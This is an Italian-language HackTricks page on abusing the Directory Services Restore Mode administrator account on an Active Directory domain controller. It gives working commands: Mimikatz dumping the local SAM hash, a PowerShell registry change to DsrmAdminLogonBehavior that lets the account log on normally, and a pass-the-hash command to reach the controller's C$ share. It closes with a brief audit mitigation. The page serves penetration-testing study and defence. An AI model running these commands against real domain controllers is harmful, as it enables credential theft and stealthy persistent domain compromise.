# Credenziali DSRM

{{#include ../../banners/hacktricks-training.md}}

## Informazioni di base

Ogni controller di dominio dispone di un account amministratore Directory Services Restore Mode (DSRM). La relativa password viene impostata durante la promozione del controller di dominio ed è separata dagli account del dominio Active Directory.<sup>[[1]](#references)</sup>

Un attaccante con controllo amministrativo di un controller di dominio può eseguire il dump del database SAM locale e recuperare l'hash NTLM dell'account Administrator DSRM. Il seguente comando Mimikatz esegue questa operazione:<sup>[[2]](#references)</sup>
```powershell
Invoke-Mimikatz -Command '"token::elevate" "lsadump::sam"'
```
Per impostazione predefinita, l'account DSRM è destinato alla modalità di ripristino. Impostare `DsrmAdminLogonBehavior` su `2` consente a questo account locale di autenticarsi mentre il domain controller è in esecuzione normale. Verificare il valore prima di modificarlo:<sup>[[2]](#references)[[3]](#references)</sup>
```powershell
$lsaPath = 'HKLM:\SYSTEM\CurrentControlSet\Control\Lsa'
$current = Get-ItemProperty -Path $lsaPath -Name DsrmAdminLogonBehavior -ErrorAction SilentlyContinue

if ($null -eq $current) {
New-ItemProperty -Path $lsaPath -Name DsrmAdminLogonBehavior -Value 2 -PropertyType DWORD
} else {
Set-ItemProperty -Path $lsaPath -Name DsrmAdminLogonBehavior -Value 2
}
```
L'hash recuperato può quindi essere utilizzato in una sessione pass-the-hash per accedere a risorse come la share amministrativa `C$`. Per questo account locale, usa il nome del computer del domain controller come valore di `/domain`:<sup>[[3]](#references)</sup>
```powershell
sekurlsa::pth /domain:dc-host-name /user:Administrator /ntlm:b629ad5753f4c441e3af31c97fad8973 /run:powershell.exe
# In the new PowerShell process, access C$ over NTLM.
ls \\dc-host-name\C$
```
## Mitigazione

- Eseguire l'audit delle modifiche a `HKLM:\System\CurrentControlSet\Control\Lsa\DsrmAdminLogonBehavior`. L'evento di sicurezza 4657 registra una modifica del valore del Registro di sistema quando il SACL della chiave è configurato per eseguire l'audit delle operazioni **Set Value**.<sup>[[4]](#references)</sup>

## References

- [1] [Microsoft: Reimpostare la password dell'amministratore della modalità di ripristino dei servizi directory](https://learn.microsoft.com/en-us/troubleshoot/windows-server/active-directory/reset-directory-services-restore-mode-admin-pwd)
- [2] [ADSecurity: Persistenza furtiva in Active Directory n. 11 — Directory Service Restore Mode](https://adsecurity.org/?p=1714)
- [3] [ADSecurity: Persistenza furtiva in Active Directory n. 13 — Persistenza DSRM v2](https://adsecurity.org/?p=1785)
- [4] [Microsoft: Evento 4657 — Un valore del Registro di sistema è stato modificato](https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-10/security/threat-protection/auditing/event-4657)
{{#include ../../banners/hacktricks-training.md}}
